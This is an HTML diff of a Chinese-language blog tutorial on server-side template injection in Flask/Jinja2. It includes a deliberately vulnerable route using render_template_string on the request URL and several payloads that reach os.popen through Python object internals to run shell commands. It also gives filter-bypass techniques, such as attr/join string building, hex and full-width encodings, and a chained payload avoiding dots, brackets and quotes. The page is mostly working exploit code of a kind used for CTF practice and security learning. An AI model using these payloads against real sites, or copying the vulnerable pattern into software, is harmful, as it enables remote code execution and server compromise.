@@ -327,21 +327,37 @@
 <p>后端渲染：数据传输到服务器或者数据直接存储在服务器中，后端使用模板解析这些数据并渲染成 HTML 返回给浏览器</p>
 <p>前端渲染：浏览器从服务器得到的是数据，由浏览器前端渲染成 HTML 给用户</p>
 <p>就比如要在前端显示用户名，但是每个用户的名字不同，我们要接收数据后，渲染到 name 变量中，再展示给用户</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;$name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;html&gt;
+&lt;h1&gt;&#123;$name&#125;&lt;&#x2F;h1&gt;
+&lt;&#x2F;html&gt;</code></pre>
 
 <p>‍</p>
 <h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p>这里记录一下 flask 的漏洞</p>
 <p>flask 使用 <code>render_template()</code>​ 来渲染模板，使用这个方法是不会产生 ssti 的，因为输入的内容会先被 <code>render_template()</code> 渲染好，已经不可控了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">	name = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,name=name)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&quot;&#x2F;login&quot;)
+def login():
+	name &#x3D; 1
+    return render_template(&quot;login.html&quot;,name&#x3D;name)</code></pre>
 
 <p>但是如果偷懒，比如下面直接用格式化拼接用户可控的字符，就会出现 ssti 漏洞</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&#39;&#x2F;test&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])
+def test():
+    template &#x3D; &#39;&#39;&#39;
+        &lt;div class&#x3D;&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;
+            &lt;h3&gt;%s&lt;&#x2F;h3&gt;
+        &lt;&#x2F;div&gt; 
+    &#39;&#39;&#39; %(request.url)
+
+    return render_template_string(template)</code></pre>
 
 <hr>
 <p>在 flask 中，模板有几种语法</p>
 <ol>
 <li><p><code>&#123;% %&#125;</code> 可以用来声明变量，也可以用来构造循环语句和条件语句</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> x = <span class="string">&#x27;marin&#x27;</span> %&#125;  <span class="comment"># 声明变量</span></span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]%&#125; &#123;&#123;i&#125;&#125; &#123;% endfor %&#125; <span class="comment">#循环</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>=<span class="number">5</span>*<span class="number">5</span> %&#125; &#123;&#123;<span class="number">1</span>&#125;&#125; &#123;% endif %&#125;   <span class="comment">#条件</span></span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set x &#x3D; &#39;marin&#39; %&#125;  # 声明变量
+&#123;% for i in [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]%&#125; &#123;&#123;i&#125;&#125; &#123;% endfor %&#125; #循环
+&#123;% if 25&#x3D;5*5 %&#125; &#123;&#123;1&#125;&#125; &#123;% endif %&#125;   #条件</code></pre></li>
 <li><p><code>&#123;&#123; &#125;&#125;</code> 可以用来将表达式打印到模板输出</p>
 </li>
 <li><p>&#96;&#96; 表示未包含在模板输出中的注释</p>
@@ -389,19 +405,19 @@
 <p>运行时的环境变量</p>
 </li>
 </ul>
-<h5 id="基础-payload"><a href="#基础-payload" class="headerlink" title="基础 payload"></a>基础 payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls ../&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="基础-payload"><a href="#基础-payload" class="headerlink" title="基础 payload"></a>基础 payload</h5><pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls ..&#x2F;&#39;).read() &#125;&#125;</code></pre>
 
 <p>‍</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; url_for.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
 
 <p>‍</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125;&#125;</code></pre>
 
 <p>‍</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; x.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
 
 <p>‍</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> (lipsum|attr(__globals__)).os.popen(<span class="string">&#x27;ls&#x27;</span>).read() %&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print (lipsum|attr(__globals__)).os.popen(&#39;ls&#39;).read() %&#125;</code></pre>
 
 <h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><ul>
 <li><p><code>request</code> 绕过</p>
@@ -416,42 +432,72 @@
 <ol>
 <li><p><code>attr</code></p>
 <p> 用来动态获取某个属性的值</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; obj|attr(<span class="string">&#x27;属性&#x27;</span>) &#125;&#125;</span><br><span class="line">&#123;&#123; attr(obj,<span class="string">&#x27;属性&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; obj|attr(&#39;属性&#39;) &#125;&#125;
+&#123;&#123; attr(obj,&#39;属性&#39;) &#125;&#125;</code></pre></li>
 <li><p><code>string|list</code></p>
 <p> 将对象转化为字符串，然后再转化为列表，可以用来获取字符，相当于 <code>str()</code>​、<code>list()</code></p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; (config|string|<span class="built_in">list</span>).pop()[i] &#125;&#125;</span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; (config|string|list).pop()[i] &#125;&#125;</code></pre></li>
 <li><p><code>join</code></p>
 <p> 把可迭代对象的元素拼接成一个字符串<br> 一般和 <code>dict()</code>​ 配合构造属性，作用于字典时，会将 key 拼接起来，默认用 <code>&#39;&#39;</code> 拼接<br> 作用于元组时，就是直接拼接起来</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(_,_,<span class="built_in">dict</span>(builtins=a)|join,_,_)|join %&#125;</span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;b)|join %&#125;
+&#123;% set built&#x3D;(_,_,dict(builtins&#x3D;a)|join,_,_)|join %&#125;</code></pre></li>
 <li><p><code>length</code></p>
 <p> 用于获取数字，会返回字符串长度</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="built_in">dict</span>(a=a)|join|length %&#125;</span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;dict(a&#x3D;a)|join|length %&#125;</code></pre></li>
 <li><p><code>format</code></p>
 <p> 用于格式化字符串</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>) %&#125;</span><br><span class="line"><span class="comment"># __class__</span></span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95) %&#125;
+# __class__</code></pre></li>
 <li><p><code>replace</code></p>
 <p> 替换字符串</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>) %&#125;</span><br><span class="line"><span class="comment"># __class__</span></span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;__claee__&quot;|replace(&#39;e&#39;,&#39;s&#39;) %&#125;
+# __class__</code></pre></li>
 <li><p><code>reverse</code></p>
 <p> 反转字符串</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;__ssalc__&quot;</span>|reverse %&#125;</span><br><span class="line"><span class="comment"># __class__</span></span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;__ssalc__&quot;|reverse %&#125;
+# __class__</code></pre></li>
 <li><p><code>select</code></p>
 <p> 原本是原来筛选元素的，但是作用于空元组时，会生成一个生成器对象，然后配合 <code>string|list</code> 获取字符</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">24</span>) %&#125;</span><br></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;(()|select|string|list)|attr(pop)(24) %&#125;</code></pre></li>
 </ol>
 </li>
 <li><p>反弹 shell</p>
 </li>
 <li><p>全角字符替代</p>
 <p>可以用全角的数字替代数字</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):  </span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)  </span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:  </span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">pass</span>  </span><br><span class="line">        full += ch  </span><br><span class="line">    <span class="keyword">return</span> full  </span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    t+=<span class="string">&#x27;\&#x27;&#x27;</span>+half2full(i)+<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">def half2full(half):  
+    full &#x3D; &#39;&#39;  
+    for ch in half:  
+        if ord(ch) in range(33, 127):  
+            ch &#x3D; chr(ord(ch) + 0xfee0)  
+        elif ord(ch) &#x3D;&#x3D; 32:  
+            ch &#x3D; chr(0x3000)  
+        else:  
+            pass  
+        full +&#x3D; ch  
+    return full  
+t&#x3D;&#39;&#39;
+s&#x3D;&quot;0123456789&quot;
+for i in s:
+    t+&#x3D;&#39;\&#39;&#39;+half2full(i)+&#39;\&#39;,&#39;
+print(t)</code></pre>
 </li>
 <li><p>十六进制编码绕过</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span> %&#125;</span><br><span class="line"><span class="comment"># __class__</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;\x5f\x5fclass\x5f\x5f&quot; %&#125;
+# __class__</code></pre>
 </li>
 <li><p>绕过 <code>.</code>​ 和 <code>[]</code> 的 waf</p>
 <p>比如这个 paylaod ，最后使用的可以完全用 <code>attr</code>​ 来绕过，这里同时绕过了 <code>&#39;&#39;</code>​ ，如果正常使用的 <code>attr()</code>​ 这里是要输入字符串，不能用 <code>&#39;&#39;</code> 就需要在前面拼接出字符串再使用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=<span class="built_in">dict</span>(<span class="built_in">dir</span>=a)|join %&#125;</span><br><span class="line">&#123;&#123; (lipsum|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join %&#125;
+&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24) %&#125;
+&#123;% set ini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join %&#125;
+&#123;% set glo&#x3D;(a,a,dict(glo&#x3D;a,bals&#x3D;a)|join,a,a)|join %&#125;
+&#123;% set getitem&#x3D;(a,a,dict(get&#x3D;a,item&#x3D;a)|join,a,a)|join %&#125;
+&#123;% set popen&#x3D;dict(popen&#x3D;a)|join %&#125;
+&#123;% set read&#x3D;dict(read&#x3D;a)|join %&#125;
+&#123;% set o&#x3D;dict(os&#x3D;a)|join %&#125;
+&#123;% set cmd&#x3D;dict(dir&#x3D;a)|join %&#125;
+&#123;&#123; (lipsum|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;</code></pre>
 </li>
 <li><p>过滤了 <code>[]</code>​ 可以使用 <code>getitem</code> 获取</p>
 </li>
